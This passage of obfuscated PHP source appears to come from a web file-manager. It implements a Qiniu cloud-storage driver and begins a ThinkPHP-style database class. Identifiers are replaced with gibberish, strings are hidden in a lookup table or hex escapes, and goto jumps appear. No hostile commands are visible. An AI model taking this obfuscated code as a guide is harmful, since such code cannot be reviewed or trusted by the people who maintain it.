$à˜πﬂªƒ[$∞è’∂Ô˛[98]] = substr($›Ì˙Å√ƒ[$∞è’∂Ô˛[1547]] . $∞è’∂Ô˛[12], 0, 10); } return $à˜πﬂªƒ; } public function listPath($‰ÏÊÌóì, $Ω˛‚∆˘… = false) { $£≥£ÂÑ∏ =& $_SERVER[ˆë€Ï⁄∂]; $Æ∆Äÿ˘å = $this->fileList($‰ÏÊÌóì, $£≥£ÂÑ∏[8], !0); foreach ($Æ∆Äÿ˘å[$£≥£ÂÑ∏[95]] as $ıﬂØò¬¯ => $∫€™´ı¸) { $Æ∆Äÿ˘å[$£≥£ÂÑ∏[95]][$ıﬂØò¬¯] = $this->folderInfo($∫€™´ı¸, $Ω˛‚∆˘…); } foreach ($Æ∆Äÿ˘å[$£≥£ÂÑ∏[96]] as $ıﬂØò¬¯ => $∫€™´ı¸) { $Æ∆Äÿ˘å[$£≥£ÂÑ∏[96]][$ıﬂØò¬¯] = $this->fileInfo($∫€™´ı¸[$£≥£ÂÑ∏[107]], $Ω˛‚∆˘…, $∫€™´ı¸); } return $Æ∆Äÿ˘å; } public function has($Œ∆≈¶ÜŸ, $æÖΩŸ±⁄ = false, $ÛŸÿ¬Àﬁ = true) { $⁄ÿÎç¯… =& $_SERVER[ˆë€Ï⁄∂]; $Œ∆≈¶ÜŸ = trim($Œ∆≈¶ÜŸ, $⁄ÿÎç¯…[8]); $¡≈◊œ“™ = empty($Œ∆≈¶ÜŸ) && $Œ∆≈¶ÜŸ !== $⁄ÿÎç¯…[240] ? $⁄ÿÎç¯…[12] : $Œ∆≈¶ÜŸ . $⁄ÿÎç¯…[8]; $„„πŒÍ´ = $⁄ÿÎç¯…[12]; $Ê˚Ò‚∞“ = 500; $«üÊ¯…œ = $⁄ÿÎç¯…[8]; $√”Î◊É¥ = $ÅÛ„Ô≥Ò = 0; while (!0) { check_abort(); list($Æ≈⁄ÏƒÌ, $·í˜‹ïê) = $this->bucketManager->listFiles($this->bucket, $¡≈◊œ“™, $„„πŒÍ´, $Ê˚Ò‚∞“, $«üÊ¯…œ); if ($·í˜‹ïê) { break; } $„„πŒÍ´ = array_key_exists($⁄ÿÎç¯…[1492], $Æ≈⁄ÏƒÌ) ? $„„πŒÍ´ = $Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1548]] : $⁄ÿÎç¯…[12]; if ($æÖΩŸ±⁄) { if (!empty($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1549]])) { $√”Î◊É¥ += count($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1549]]); } if (!empty($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1550]])) { $ÅÛ„Ô≥Ò += count($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1550]]); } if ($„„πŒÍ´ === $⁄ÿÎç¯…[12]) { break; } continue; } if ($ÛŸÿ¬Àﬁ) { if (!empty($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1549]])) { return !0; } } else { if (!empty($Æ≈⁄ÏƒÌ[$⁄ÿÎç¯…[1550]])) { return !0; } } if ($„„πŒÍ´ === $⁄ÿÎç¯…[12]) { break; } } if ($æÖΩŸ±⁄) { return array($⁄ÿÎç¯…[251] => $√”Î◊É¥, $⁄ÿÎç¯…[252] => $ÅÛ„Ô≥Ò); } return !1; } public function listAll($∆ºñøÚ) { $™ÛœÑëÛ =& $_SERVER[ˆë€Ï⁄∂]; $Ô⁄Ó˜¯ø = $this->fileList($∆ºñøÚ, $™ÛœÑëÛ[12], !0); $ãéÀÔø± = array_to_keyvalue($Ô⁄Ó˜¯ø[$™ÛœÑëÛ[96]], $™ÛœÑëÛ[32]); foreach ($Ô⁄Ó˜¯ø[$™ÛœÑëÛ[95]] as $´ë‘ä√˙) { if (is_string($´ë‘ä√˙)) { $ãéÀÔø±[$´ë‘ä√˙] = array($™ÛœÑëÛ[89] => 0); } } return $this->listAllFiles($∆ºñøÚ, $ãéÀÔø±); } private function fileList($’ÛÙ…ØÅ, $ıËÜé˛¡ = '', $œııòî≈ = 0) { $Ïﬁ„à« =& $_SERVER[ˆë€Ï⁄∂]; $’ÛÙ…ØÅ = trim($’ÛÙ…ØÅ, $Ïﬁ„à«[8]); $±óí±É˝ = empty($’ÛÙ…ØÅ) && $’ÛÙ…ØÅ !== $Ïﬁ„à«[240] ? $Ïﬁ„à«[12] : $’ÛÙ…ØÅ . $Ïﬁ„à«[8]; $ﬁùÀ¨®î = $Ïﬁ„à«[12]; $ã˘õíö∏ = 1000; $Ì∂¬˜∏À = $˛„ë≥√„ = array(); while (!0) { check_abort(); list($é‚£ÙØª, $ËŸ—µµÎ) = $this->bucketManager->listFiles($this->bucket, $±óí±É˝, $ﬁùÀ¨®î, $ã˘õíö∏, $ıËÜé˛¡); if ($ËŸ—µµÎ) { break; } $ﬁùÀ¨®î = array_key_exists($Ïﬁ„à«[1492], $é‚£ÙØª) ? $ﬁùÀ¨®î = $é‚£ÙØª[$Ïﬁ„à«[1548]] : $Ïﬁ„à«[12]; $ß€Î›ê‰ = isset($é‚£ÙØª[$Ïﬁ„à«[1549]]) ? $é‚£ÙØª[$Ïﬁ„à«[1549]] : array(); $‘Å‹ö∫¿ = isset($é‚£ÙØª[$Ïﬁ„à«[1550]]) ? $é‚£ÙØª[$Ïﬁ„à«[1550]] : array(); foreach ($ß€Î›ê‰ as $Ù“∑î£Ü) { if ($Ù“∑î£Ü[$Ïﬁ„à«[107]] == $±óí±É˝) { continue; } $∏„éªó™ = $Ù“∑î£Ü[$Ïﬁ„à«[107]]; $À˝‹˙¢ = $Ù“∑î£Ü[$Ïﬁ„à«[1546]]; $Ù“∑î£Ü[$Ïﬁ„à«[89]] = $À˝‹˙¢; $—ôÊñÿ’ = $À˝‹˙¢ == 0 && substr($∏„éªó™, strlen($∏„éªó™) - 1, 1) == $Ïﬁ„à«[8] ? !0 : !1; $this->cacheMethodInfoSet($∏„éªó™, $—ôÊñÿ’, $Ù“∑î£Ü); if ($—ôÊñÿ’) { $Ì∂¬˜∏À[] = $∏„éªó™; continue; } $˛„ë≥√„[] = $œııòî≈ ? $Ù“∑î£Ü : $∏„éªó™; } foreach ($‘Å‹ö∫¿ as $∏„éªó™) { if ($∏„éªó™ == $±óí±É˝) { continue; } $Ì∂¬˜∏À[] = $∏„éªó™; $this->cacheMethodInfoSet($∏„éªó™, !0); } if ($ﬁùÀ¨®î === $Ïﬁ„à«[12]) { break; } } $this->cacheMethodInfoSet($’ÛÙ…ØÅ, !0); return array($Ïﬁ„à«[95] => $Ì∂¬˜∏À, $Ïﬁ„à«[96] => $˛„ë≥√„); } public function canRead($∑€¯Œﬁú) { return $this->exist($∑€¯Œﬁú) ? !0 : !1; } public function canWrite($˘üÙ¿¥Ω) { return $this->exist($˘üÙ¿¥Ω) ? !0 : !1; } public function getContent($§Ñ◊â˜œ) { return $this->fileSubstr($§Ñ◊â˜œ, 0, -1); } public function setContent($±ÎÏçÊÌ, $—∞ÕÇœõ = '') { $ì®ÄËì = $this->tempFile($this->pathThis($±ÎÏçÊÌ)); file_put_contents($ì®ÄËì, $—∞ÕÇœõ); if ($this->upload($±ÎÏçÊÌ, $ì®ÄËì)) { $this->tempFileRemve($ì®ÄËì); return !0; } return !1; } public function refreshUrls($∂˜£ãÅÓ) { $∫˛ä£ÇÉ =& $_SERVER[ˆë€Ï⁄∂]; $ªúÈﬁÌ  = array(); if (is_array($∂˜£ãÅÓ)) { foreach ($∂˜£ãÅÓ as $ˆ…Àâ⁄‡) { $ªúÈﬁÌ [] = $this->link($ˆ…Àâ⁄‡); } } else { $ªúÈﬁÌ [] = $this->link($∂˜£ãÅÓ); } $Æ˘¢Ó≈ = new Qiniu\Cdn\CdnManager($this->auth); list($¬Ÿ É±∆, $ÂÕƒ‹Â©) = $Æ˘¢Ó≈->refreshUrls($ªúÈﬁÌ ); if ($ÂÕƒ‹Â©) { return !1; } return $¬Ÿ É±∆[$∫˛ä£ÇÉ[1279]] == $∫˛ä£ÇÉ[850] ? !0 : !1; } public function fileSubstr($í¨∞áèÛ, $àìﬁ˚ﬁ‘, $Ìßã°Àé) { $•£∑›ï≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!($ÖÃΩÜéÉ = $this->link($í¨∞áèÛ))) { return !1; } $ÜÜÊõ∆î = !1; if ($Ìßã°Àé > 0) { $ÙÛ≈…¯¸ = $àìﬁ˚ﬁ‘ + $Ìßã°Àé - 1; $ÜÜÊõ∆î = array($•£∑›ï≥[1551] . $àìﬁ˚ﬁ‘ . $•£∑›ï≥[473] . $ÙÛ≈…¯¸); } $¡√›–óù = url_request($ÖÃΩÜéÉ, $•£∑›ï≥[1511], !1, $ÜÜÊõ∆î); return $¡√›–óù[$•£∑›ï≥[841]] ? $¡√›–óù[$•£∑›ï≥[1302]] : !1; } public function upload($˘“Ô…·Ω, $ôÏ˜ê¬ﬁ, $ï…ô∂ÿß = false, $…ÌÉÕ‹Ë = REPEAT_REPLACE) { $ÌÿÒë¿Î = new Qiniu\Storage\UploadManager(); $â¶µ¶»∏ = $this->auth->uploadToken($this->bucket, $˘“Ô…·Ω); $°ﬁÓÉ’ã = get_file_mime(get_path_ext($ôÏ˜ê¬ﬁ)); list($œƒèıÿ∑, $π·â÷Ãè) = $ÌÿÒë¿Î->putFile($â¶µ¶»∏, $˘“Ô…·Ω, $ôÏ˜ê¬ﬁ, null, $°ﬁÓÉ’ã); return $π·â÷Ãè ? !1 : $this->getPathOuter($˘“Ô…·Ω); } public function uploadFormData($û¡‘Ë®›, $Óª’·Ï = 3600) { return $this->uploadToken($û¡‘Ë®›, $Óª’·Ï); } public function uploadMultiData($Å⁄òœ†‰, $•ú»‡ıÇ = 3600) { return $this->uploadToken($Å⁄òœ†‰, $•ú»‡ıÇ); } private function uploadToken($ö·ó∂Î‘, $˘í£ÁÂŸ = 3600) { $ùêƒâäÉ =& $_SERVER[ˆë€Ï⁄∂]; $î÷∑Íù˝ = $˘í£ÁÂŸ; $π∞ú§éî = array($ùêƒâäÉ[1552] => $ùêƒâäÉ[1553]); $Ü»€‚Ü˚ = $ö·ó∂Î‘; $¢”€ßˆâ = $this->auth->uploadToken($this->bucket, $Ü»€‚Ü˚, $î÷∑Íù˝, $π∞ú§éî, !0); $Å‘„õ˙˘ = empty($this->region) || $this->region == $ùêƒâäÉ[1554] ? $ùêƒâäÉ[12] : $ùêƒâäÉ[473] . $this->region; $ÏæêúÎ› = http_type() . "\72\x2f\57\165\x70\154\157\141\x64{$Å‘„õ˙˘}\x2e\x71\151\156\151\x75\160\x2e\143\x6f\155\x2f"; return array($ùêƒâäÉ[1555] => $¢”€ßˆâ, $ùêƒâäÉ[1556] => $ÏæêúÎ›); } public function download($·ï‘úÓ¬, $˚¯Á‰∆Ì) { $©œ◊—˘≤ = IO::getPathInner(IO::mkfile($˚¯Á‰∆Ì)); if (!($Ë‘⁄˚õï = $this->link($·ï‘úÓ¬))) { return !1; } $⁄¶û—àƒ = 0; $‰„”ïœ• = 1024 * 200; $œÿ⁄¸◊· = fopen($©œ◊—˘≤, $_SERVER[ˆë€Ï⁄∂][1557]); while (!0) { $Õ´≠å©— = $this->fileSubstr($·ï‘úÓ¬, $⁄¶û—àƒ, $‰„”ïœ•); if ($Õ´≠å©— === !1) { return !1; } fwrite($œÿ⁄¸◊·, $Õ´≠å©—); $⁄¶û—àƒ += $‰„”ïœ•; if (strlen($Õ´≠å©—) < $‰„”ïœ•) { break; } } fclose($œÿ⁄¸◊·); return $˚¯Á‰∆Ì; } public function link($Ï€ﬂ√éö, $Ê˚Ö¯„Ä = '') { if (!$this->isFile($Ï€ﬂ√éö)) { return !1; } $Üó∫¯°å = $this->getHost() . $_SERVER[ˆë€Ï⁄∂][8] . $this->pathEncode($Ï€ﬂ√éö) . $Ê˚Ö¯„Ä; return $this->auth->privateDownloadUrl($Üó∫¯°å, 3600 * 12); } public function fileOut($∆˝àÖÔﬁ, $Óπ‘ùñª = false, $ÆÏ‰“ä¡ = false, $œ«‡ï£Ù = '') { $˘â∑¥÷° =& $_SERVER[ˆë€Ï⁄∂]; if ($this->isFileOutServer()) { return $this->fileOutServer($∆˝àÖÔﬁ, $Óπ‘ùñª, $ÆÏ‰“ä¡, $œ«‡ï£Ù); } if (!$ÆÏ‰“ä¡) { $ÆÏ‰“ä¡ = $this->pathThis($∆˝àÖÔﬁ); } $ö¸∫ÒÀ© = $Óπ‘ùñª ? $˘â∑¥÷°[1558] . rawurlencode($ÆÏ‰“ä¡) : $˘â∑¥÷°[12]; $∑˚Ø◊ú… = $this->link($∆˝àÖÔﬁ, $ö¸∫ÒÀ©); $this->fileOutLink($∑˚Ø◊ú…); } public function fileOutServer($ÕùÕÆ˙Ø, $ıˆÛãæ¶ = false, $ß¯˙∆íµ = false, $‘öì’ı≥ = '') { parent::fileOut($ÕùÕÆ˙Ø, $ıˆÛãæ¶, $ß¯˙∆íµ, $‘öì’ı≥); } public function fileOutImage($∫°Àê¬ª, $Ω¿ ¨∫Ë = 250) { if ($this->size($∫°Àê¬ª) > 1024 * 1024 * 20) { return $this->fileOutImageServer($∫°Àê¬ª, $Ω¿ ¨∫Ë); } $›ùõ‡È∫ = $this->link($∫°Àê¬ª, $_SERVER[ˆë€Ï⁄∂][1559] . $Ω¿ ¨∫Ë); $this->fileOutLink($›ùõ‡È∫); } public function fileOutImageServer($óÿ√∂ëÌ, $˚†¡ÈÆÆ = 250) { parent::fileOutImage($óÿ√∂ëÌ, $˚†¡ÈÆÆ); } public function hashMd5($⁄˛â’ŒÃ) { $ŒÉ†Ô¨˝ =& $_SERVER[ˆë€Ï⁄∂]; $ç¥—ﬁ ≥ = $this->objectMeta($⁄˛â’ŒÃ); return isset($ç¥—ﬁ ≥[$ŒÉ†Ô¨˝[257]]) ? $ç¥—ﬁ ≥[$ŒÉ†Ô¨˝[257]] : !1; $çŒëÉ≠Ì = $this->link($⁄˛â’ŒÃ, $ŒÉ†Ô¨˝[1560]); } public function size($ïØÙ–ˆµ) { $ƒ‡¸–˙ﬁ = $this->objectMeta($ïØÙ–ˆµ); return $ƒ‡¸–˙ﬁ ? $ƒ‡¸–˙ﬁ[$_SERVER[ˆë€Ï⁄∂][89]] : 0; } public function info($∞©¬ï√∂) { if ($this->isFolder($∞©¬ï√∂)) { return $this->folderInfo($∞©¬ï√∂); } else { if ($this->isFile($∞©¬ï√∂)) { return $this->fileInfo($∞©¬ï√∂); } } return !1; } public function exist($¯ü‹¸†») { return $this->isFile($¯ü‹¸†») || $this->isFolder($¯ü‹¸†»); } public function isFile($÷óÌ‹µ≈) { return !$this->isFolder($÷óÌ‹µ≈) && $this->objectMeta($÷óÌ‹µ≈); } public function isFolder($ëú≠§µ’) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][189], $ëú≠§µ’); } protected function objectMeta($Ö“◊«åƒ) { return $this->cacheMethod($_SERVER[ˆë€Ï⁄∂][191], $Ö“◊«åƒ); } protected function _objectMeta($˜¬¶ê—·) { $ó∂≤Í≤È =& $_SERVER[ˆë€Ï⁄∂]; list($Ö˚Ë‘ìŸ, $¥¬ºÙªô) = $this->bucketManager->stat($this->bucket, $˜¬¶ê—·); if ($Ö˚Ë‘ìŸ) { $Ö˚Ë‘ìŸ[$ó∂≤Í≤È[89]] = intval($Ö˚Ë‘ìŸ[$ó∂≤Í≤È[1546]]); } return $Ö˚Ë‘ìŸ; } protected function _isFolder($’‚éú˚—) { $∂ÁÃ˙≤∏ =& $_SERVER[ˆë€Ï⁄∂]; if ($’‚éú˚— == $∂ÁÃ˙≤∏[12] || $’‚éú˚— == $∂ÁÃ˙≤∏[8]) { return !0; } list($£⁄°ø’€, $∞·«ä∫π) = $this->bucketManager->listFiles($this->bucket, trim($’‚éú˚—, $∂ÁÃ˙≤∏[8]) . $∂ÁÃ˙≤∏[8], $∂ÁÃ˙≤∏[12], 1, $∂ÁÃ˙≤∏[8]); return !empty($£⁄°ø’€[$∂ÁÃ˙≤∏[1549]]) || !empty($£⁄°ø’€[$∂ÁÃ˙≤∏[1550]]) ? !0 : !1; } } goto cÔ¥üëıé®; e°ÂÜÉÑ§Ø: class DbSqlite3 extends DbSqlite3Base { public function query($à®ìéŸ“) { $Ÿ ô£≤∞ =& $_SERVER[ˆë€Ï⁄∂]; if (!CacheLock::fileLock($Ÿ ô£≤∞[13])) { return !1; } $∑∞◊ﬂ£º = parent::query($à®ìéŸ“); CacheLock::fileUnLock($Ÿ ô£≤∞[13]); return $∑∞◊ﬂ£º; } public function execute($˛•˚†¶) { $ã•·éØﬂ =& $_SERVER[ˆë€Ï⁄∂]; if (!CacheLock::fileLock($ã•·éØﬂ[13])) { return !1; } $¥Ê˜ÔÈÄ = parent::execute($˛•˚†¶); CacheLock::fileUnLock($ã•·éØﬂ[13]); return $¥Ê˜ÔÈÄ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\x67\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\145\x6c\x74" => "\74\75", "\x6e\157\164\x6c\151\153\x65" => "\116\x4f\124\40\114\x49\113\x45", "\x6c\151\x6b\x65" => "\x4c\x49\113\x45", "\151\156" => "\x49\116", "\156\x6f\164\151\156" => "\116\117\124\40\x49\x4e", "\x6e\157\x74\40\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\142\145\x74\x77\x65\145\156" => "\x42\105\x54\127\x45\x45\116", "\156\157\x74\142\145\x74\167\x65\145\x6e" => "\x4e\117\x54\40\102\x45\x54\127\105\105\x4e", "\x6e\157\164\x20\x62\x65\164\167\145\x65\156" => "\116\117\124\x20\102\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\x45\103\124\45\104\111\123\x54\111\116\x43\x54\45\x20\45\106\x49\x45\x4c\x44\45\x20\106\x52\x4f\115\40\x25\124\101\102\x4c\x45\x25\x25\112\x4f\x49\x4e\45\45\127\110\x45\122\x45\45\45\x47\x52\117\x55\x50\x25\45\110\101\126\x49\x4e\107\x25\x25\117\122\x44\105\122\x25\x25\114\x49\115\x49\124\x25\x20\45\x55\x4e\x49\117\x4e\45\x25\103\x4f\x4d\115\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $âÄ°÷Â» = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ˆë€Ï⁄∂][1052], $âÄ°÷Â»); } public function factory($ü∆≠û—◊ = '') { $—ÃúºﬁŸ =& $_SERVER[ˆë€Ï⁄∂]; $ü∆≠û—◊ = $this->parseConfig($ü∆≠û—◊); if (empty($ü∆≠û—◊[$—ÃúºﬁŸ[1053]])) { think_exception(think_lang($—ÃúºﬁŸ[1054])); } $this->dbType = ucwords(strtolower($ü∆≠û—◊[$—ÃúºﬁŸ[1053]])); $óëôÑ°Ã = $—ÃúºﬁŸ[1055] . $this->dbType; if (class_exists($óëôÑ°Ã)) { $æÚÑ∫≤ù = new $óëôÑ°Ã($ü∆≠û—◊); if ($—ÃúºﬁŸ[1056] != strtolower($ü∆≠û—◊[$—ÃúºﬁŸ[1053]])) { $æÚÑ∫≤ù->dbType = strtoupper($this->dbType); } else { $æÚÑ∫≤ù->dbType = $this->_getDsnType($ü∆≠û—◊[$—ÃúºﬁŸ[1008]]); } } else { think_exception(think_lang($—ÃúºﬁŸ[1057]) . $—ÃúºﬁŸ[1058] . $óëôÑ°Ã); } return $æÚÑ∫≤ù; } public function __call($ù¯ú∏áﬁ, $ÖÿÜ©ûç) { if (method_exists($this, $ù¯ú∏áﬁ)) { return call_user_func_array(array($this, $ù¯ú∏áﬁ), $ÖÿÜ©ûç); } } protected function _getDsnType($Í√∞¿éù) { $æ¡îü‘ë = explode($_SERVER[ˆë€Ï⁄∂][4], $Í√∞¿éù); $ØÔå”Í∆ = strtoupper(trim($æ¡îü‘ë[0])); return $ØÔå”Í∆; } private function parseConfig($Ü¯¡“¯Ó = '') { $“Ë§îÌí =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($Ü¯¡“¯Ó) && is_string($Ü¯¡“¯Ó)) { $Ü¯¡“¯Ó = $this->parseDSN($Ü¯¡“¯Ó); } elseif (is_array($Ü¯¡“¯Ó)) { $Ü¯¡“¯Ó = array_change_key_case($Ü¯¡“¯Ó); $Ü¯¡“¯Ó = array($“Ë§îÌí[1053] => $Ü¯¡“¯Ó[$“Ë§îÌí[1059]], $“Ë§îÌí[980] => $Ü¯¡“¯Ó[$“Ë§îÌí[1060]], $“Ë§îÌí[981] => $Ü¯¡“¯Ó[$“Ë§îÌí[1061]], $“Ë§îÌí[978] => $Ü¯¡“¯Ó[$“Ë§îÌí[1062]], $“Ë§îÌí[979] => $Ü¯¡“¯Ó[$“Ë§îÌí[1063]], $“Ë§îÌí[21] => $Ü¯¡“¯Ó[$“Ë§îÌí[1064]], $“Ë§îÌí[1008] => $Ü¯¡“¯Ó[$“Ë§îÌí[1065]], $“Ë§îÌí[17] => isset($Ü¯¡“¯Ó[$“Ë§îÌí[1066]]) ? $Ü¯¡“¯Ó[$“Ë§îÌí[1066]] : array()); } elseif (empty($Ü¯¡“¯Ó)) { if (think_config($“Ë§îÌí[1067]) && $“Ë§îÌí[1056] != strtolower(think_config($“Ë§îÌí[1068]))) { $Ü¯¡“¯Ó = $this->parseDSN(think_config($“Ë§îÌí[1067])); } else { $Ü¯¡“¯Ó = array($“Ë§îÌí[1053] => think_config($“Ë§îÌí[1068]), $“Ë§îÌí[980] => think_config($“Ë§îÌí[1069]), $“Ë§îÌí[981] => think_config($“Ë§îÌí[1070]), $“Ë§îÌí[978] => think_config($“Ë§îÌí[1071]), $“Ë§îÌí[979] => think_config($“Ë§îÌí[1072]), $“Ë§îÌí[21] => think_config($“Ë§îÌí[334]), $“Ë§îÌí[1008] => think_config($“Ë§îÌí[1067]), $“Ë§îÌí[17] => think_config($“Ë§îÌí[1073])); } } return $Ü¯¡“¯Ó; } protected function initConnect($ƒÌ©∏ûË = true) { if (1 == think_config($_SERVER[ˆë€Ï⁄∂][22])) { $this->_linkID = $this->multiConnect($ƒÌ©∏ûË); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ò°∂Êó– => $Øí⁄∫«ò) { $this->_linkID = $Øí⁄∫«ò; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($È¸—‡≈º = false) { $§ÖìÏ‘‚ =& $_SERVER[ˆë€Ï⁄∂]; static $À±”òÓã = array(); static $Ñó ‘£∏ = -1; if (empty($À±”òÓã)) { foreach ($this->config as $…òô£ÎÁ => $∏ãÕ´Ÿ‹) { $À±”òÓã[$…òô£ÎÁ] = explode($§ÖìÏ‘‚[50], $∏ãÕ´Ÿ‹); } } if (think_config($§ÖìÏ‘‚[1074])) { if ($È¸—‡≈º || think_config($§ÖìÏ‘‚[482]) === !0) { $ü‡πÀÑ— = floor(mt_rand(0, think_config($§ÖìÏ‘‚[1075]) - 1)); $Ñó ‘£∏ = $ü‡πÀÑ—; } else { if (is_numeric(think_config($§ÖìÏ‘‚[1076]))) { $ü‡πÀÑ— = think_config($§ÖìÏ‘‚[1076]); } else { $ü‡πÀÑ— = floor(mt_rand(think_config($§ÖìÏ‘‚[1075]), count($À±”òÓã[$§ÖìÏ‘‚[978]]) - 1)); } } } else { $ü‡πÀÑ— = floor(mt_rand(0, count($À±”òÓã[$§ÖìÏ‘‚[978]]) - 1)); $Ñó ‘£∏ = $ü‡πÀÑ—; } $ü‡πÀÑ— = $Ñó ‘£∏ !== -1 ? $Ñó ‘£∏ : $ü‡πÀÑ—; $¨¨»é´π = array($§ÖìÏ‘‚[980] => isset($À±”òÓã[$§ÖìÏ‘‚[980]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[980]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[980]][0], $§ÖìÏ‘‚[981] => isset($À±”òÓã[$§ÖìÏ‘‚[981]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[981]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[981]][0], $§ÖìÏ‘‚[978] => isset($À±”òÓã[$§ÖìÏ‘‚[978]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[978]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[978]][0], $§ÖìÏ‘‚[979] => isset($À±”òÓã[$§ÖìÏ‘‚[979]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[979]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[979]][0], $§ÖìÏ‘‚[21] => isset($À±”òÓã[$§ÖìÏ‘‚[21]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[21]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[21]][0], $§ÖìÏ‘‚[1008] => isset($À±”òÓã[$§ÖìÏ‘‚[1008]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[1008]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[1008]][0], $§ÖìÏ‘‚[17] => isset($À±”òÓã[$§ÖìÏ‘‚[17]][$ü‡πÀÑ—]) ? $À±”òÓã[$§ÖìÏ‘‚[17]][$ü‡πÀÑ—] : $À±”òÓã[$§ÖìÏ‘‚[17]][0]); return $this->connect($¨¨»é´π, $ü‡πÀÑ—); } public function parseDSN($äõı√Æõ) { $—ç«Ò∞§ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($äõı√Æõ)) { return !1; } $≠˘¸Ïô˜ = parse_url($äõı√Æõ); if ($≠˘¸Ïô˜[$—ç«Ò∞§[217]]) { $±˘»ˆ…Å = array($—ç«Ò∞§[1053] => $≠˘¸Ïô˜[$—ç«Ò∞§[217]], $—ç«Ò∞§[980] => isset($≠˘¸Ïô˜[$—ç«Ò∞§[676]]) ? $≠˘¸Ïô˜[$—ç«Ò∞§[676]] : $—ç«Ò∞§[12], $—ç«Ò∞§[981] => isset($≠˘¸Ïô˜[$—ç«Ò∞§[1077]]) ? $≠˘¸Ïô˜[$—ç«Ò∞§[1077]] : $—ç«Ò∞§[12], $—ç«Ò∞§[978] => isset($≠˘¸Ïô˜[$—ç«Ò∞§[218]]) ? $≠˘¸Ïô˜[$—ç«Ò∞§[218]] : $—ç«Ò∞§[12], $—ç«Ò∞§[979] => isset($≠˘¸Ïô˜[$—ç«Ò∞§[219]]) ? $≠˘¸Ïô˜[$—ç«Ò∞§[219]] : $—ç«Ò∞§[12], $—ç«Ò∞§[21] => isset($≠˘¸Ïô˜[$—ç«Ò∞§[97]]) ? substr($≠˘¸Ïô˜[$—ç«Ò∞§[97]], 1) : $—ç«Ò∞§[12]); } else { preg_match($—ç«Ò∞§[1078], trim($äõı√Æõ), $¶éûÇÍ°); $±˘»ˆ…Å = array($—ç«Ò∞§[1053] => $¶éûÇÍ°[1], $—ç«Ò∞§[980] => $¶éûÇÍ°[2], $—ç«Ò∞§[981] => $¶éûÇÍ°[3], $—ç«Ò∞§[978] => $¶éûÇÍ°[4], $—ç«Ò∞§[979] => $¶éûÇÍ°[5], $—ç«Ò∞§[21] => $¶éûÇÍ°[6]); } $±˘»ˆ…Å[$—ç«Ò∞§[1008]] = $—ç«Ò∞§[12]; return $±˘»ˆ…Å; } protected function debug() { $˚÷õ˙ª˚ =& $_SERVER[ˆë€Ï⁄∂]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $˚÷õ˙ª˚[1079]; if (think_config($˚÷õ˙ª˚[1080])) { think_status($˚÷õ˙ª˚[1081]); think_trace($this->queryStr . $˚÷õ˙ª˚[1082] . think_status($˚÷õ˙ª˚[24], $˚÷õ˙ª˚[1081], 6) . $˚÷õ˙ª˚[1083], $˚÷õ˙ª˚[12], $˚÷õ˙ª˚[1084]); } } protected function parseLock($˜°Ç∞ûì = false) { $¬°ç¶Ÿ≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!$˜°Ç∞ûì) { return $¬°ç¶Ÿ≥[12]; } if ($¬°ç¶Ÿ≥[1010] == $this->dbType) { return $¬°ç¶Ÿ≥[1085]; } return $¬°ç¶Ÿ≥[1086]; } protected function parseSet($¶âü¥ÈÆ) { $¢«ï„ƒñ =& $_SERVER[ˆë€Ï⁄∂]; foreach ($¶âü¥ÈÆ as $¯ÜîÔãÖ => $ëŸ‘µ†ø) { if (is_array($ëŸ‘µ†ø) && $¢«ï„ƒñ[383] == $ëŸ‘µ†ø[0]) { $Èﬁ Àﬂ≥[] = $this->parseKey($¯ÜîÔãÖ) . $¢«ï„ƒñ[517] . $ëŸ‘µ†ø[1]; } elseif (is_scalar($ëŸ‘µ†ø) || is_null($ëŸ‘µ†ø)) { $Èﬁ Àﬂ≥[] = $this->parseKey($¯ÜîÔãÖ) . $¢«ï„ƒñ[517] . $this->parseValue($ëŸ‘µ†ø); } } return $¢«ï„ƒñ[1087] . implode($¢«ï„ƒñ[50], $Èﬁ Àﬂ≥); } protected function bindParam($¥≠ì£Ä∑, $îÖ±»ß±) { 